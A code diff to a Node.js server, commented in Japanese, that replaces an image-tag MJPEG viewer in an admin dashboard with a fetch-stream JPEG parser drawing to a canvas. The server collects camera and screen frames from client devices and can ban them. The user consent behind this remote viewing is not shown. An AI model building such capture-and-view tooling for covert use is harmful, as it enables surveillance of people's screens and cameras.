@@ -1,4 +1,4 @@
-// server.js - 完全版（BAN + カメラ + 画面ストリーミング + オンライン判定）
+// server.js - 完全版（BAN + カメラ + 画面ストリーミング + ちらつき防止）
 const express = require('express');
 const sqlite3 = require('sqlite3').verbose();
 const path = require('path');
@@ -130,7 +130,7 @@ db.all("PRAGMA table_info(camera_images)", (err, rows) => {
 
 // === キャッシュ ===
 let tokenCache = {};
-const latestScreenFrames = {}; // ★ 画面配信の最新画像をメモリに保持するオブジェクト
+const latestScreenFrames = {}; // 画面配信の最新画像をメモリに保持
 
 async function updateCache() {
   return new Promise((resolve) => {
@@ -272,18 +272,14 @@ app.get('/dashboard', async (req, res) => {
     if (adminPw) sessionStorage.setItem('adminPw', adminPw);
     else adminPw = sessionStorage.getItem('adminPw') || '';
 
-    let screenMonitorInterval = null;
-
     function closeModal() {
-      if (screenMonitorInterval) {
-        clearInterval(screenMonitorInterval);
-        screenMonitorInterval = null;
+      // Fetch通信を強制終了
+      if (window.screenStreamAbort) {
+        window.screenStreamAbort.abort(); 
+        window.screenStreamAbort = null;
       }
-      // 画像のsrcを空にしてストリーム接続を切る
-      const img = document.getElementById('screen-live-img');
-      if (img) img.src = '';
-      
       document.getElementById('modal').style.display = 'none';
+      document.getElementById('modal-content').innerHTML = '';
     }
 
     function showDeviceInfo(token) {
@@ -305,18 +301,65 @@ app.get('/dashboard', async (req, res) => {
       });
     }
 
-    function showScreenMonitor(token) {
-      if (screenMonitorInterval) clearInterval(screenMonitorInterval);
-
+    // ★修正: Fetchストリーム + Canvas 描画に変更（ちらつき防止）
+    async function showScreenMonitor(token) {
+      if (window.screenStreamAbort) window.screenStreamAbort.abort();
+      
       document.getElementById('modal-content').innerHTML = \`
         <h2>🖥️ 画面モニター</h2>
         <p><b>Token:</b> <code>\${token}</code> <span style="color:red; font-size:12px;">(30FPS ストリーミング)</span></p>
-        <div style="width:100%; background:#000; border-radius:8px; overflow:hidden; position:relative; min-height:300px; display:flex; justify-content:center; align-items:center;">
-          <!-- ストリームURLを直接指定 -->
-          <img id="screen-live-img" src="/api/screen-stream?token=\${encodeURIComponent(token)}" style="width:100%; height:auto; display:block;">
+        <div style="width:100%; background:#000; border-radius:8px; overflow:hidden; position:relative; display:flex; justify-content:center; align-items:center;">
+          <canvas id="screen-canvas" style="width:100%; height:auto; display:block;"></canvas>
         </div>
       \`;
       document.getElementById('modal').style.display = 'block';
+
+      const canvas = document.getElementById('screen-canvas');
+      const ctx = canvas.getContext('2d');
+      const controller = new AbortController();
+      window.screenStreamAbort = controller;
+
+      try {
+        const res = await fetch(\`/api/screen-stream?token=\${encodeURIComponent(token)}\`, { signal: controller.signal });
+        const reader = res.body.getReader();
+        let buffer = new Uint8Array(0);
+
+        while (true) {
+          const { value, done } = await reader.read();
+          if (done) break;
+
+          // 受け取ったデータをバッファに追加
+          const newBuf = new Uint8Array(buffer.length + value.length);
+          newBuf.set(buffer);
+          newBuf.set(value, buffer.length);
+          buffer = newBuf;
+
+          // JPEGの開始(FF D8)と終了(FF D9)を探してパース
+          let start = -1;
+          let end = -1;
+          for (let i = 0; i < buffer.length - 1; i++) {
+            if (buffer[i] === 0xFF && buffer[i + 1] === 0xD8) start = i;
+            if (buffer[i] === 0xFF && buffer[i + 1] === 0xD9) { end = i + 2; break; }
+          }
+
+          if (start !== -1 && end !== -1) {
+            const jpegData = buffer.slice(start, end);
+            buffer = buffer.slice(end); // 残りのバッファを保持
+
+            // 画像をCanvasに描画（ちらつかない）
+            createImageBitmap(new Blob([jpegData], { type: 'image/jpeg' })).then(bitmap => {
+              if (canvas.width !== bitmap.width) {
+                canvas.width = bitmap.width;
+                canvas.height = bitmap.height;
+              }
+              ctx.drawImage(bitmap, 0, 0);
+              bitmap.close();
+            }).catch(() => {});
+          }
+        }
+      } catch (e) {
+        console.log('Screen stream disconnected', e);
+      }
     }
 
     async function requestCamera(token) {
@@ -574,7 +617,7 @@ app.post('/api/camera-upload', (req, res) => {
   if (buffer.length === 0) return res.status(400).json({ error: 'empty image' });
   if (buffer.length > 5 * 1024 * 1024) return res.status(413).json({ error: 'too large' });
 
-  // ★ 画面配信の場合はDBに保存せずメモリに保持
+  // 画面配信の場合はDBに保存せずメモリに保持
   if (type === 'screen') {
     latestScreenFrames[token] = buffer;
     return res.json({ ok: true });
@@ -613,7 +656,7 @@ app.get('/api/camera-images', (req, res) => {
   });
 });
 
-// ★ 画面ストリーミング配信（MJPEG）
+// 画面ストリーミング配信（MJPEG）
 app.get('/api/screen-stream', (req, res) => {
   const { token } = req.query;
   if (!token) return res.status(400).send('token required');
